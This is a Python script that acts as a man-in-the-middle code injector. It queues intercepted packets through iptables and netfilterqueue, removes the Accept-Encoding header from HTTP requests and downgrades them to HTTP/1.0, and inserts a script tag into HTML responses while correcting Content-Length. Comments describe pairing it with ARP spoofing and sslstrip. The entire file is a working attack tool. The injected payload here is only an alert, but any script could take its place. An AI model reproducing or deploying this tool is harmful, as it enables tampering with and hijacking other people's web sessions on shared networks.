#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import re

port = 10000  # 80 for http and 10000 for https with sslstrip


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == port:  # http means 80 (Request)
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == port:  # (Response)
            injection_code = '<script>alert("Hi")</script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)  # For http
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)  # For https with sslstrip
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)  # For https with sslstrip
try:
    print("[+] Started")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Resetting DNS tables")
    subprocess.call("iptables --flush", shell=True)

# iptables -I FORWARD -j NFQUEUE --queue-num 0      //Create a queue with arp spoof
# iptables -I INPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc input packet
# iptables -I OUTPUT -j NFQUEUE --queue-num 0      //Create a queue for own pc output packet
# iptables --flush      //To delete the queue
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000     // working with sslstrip
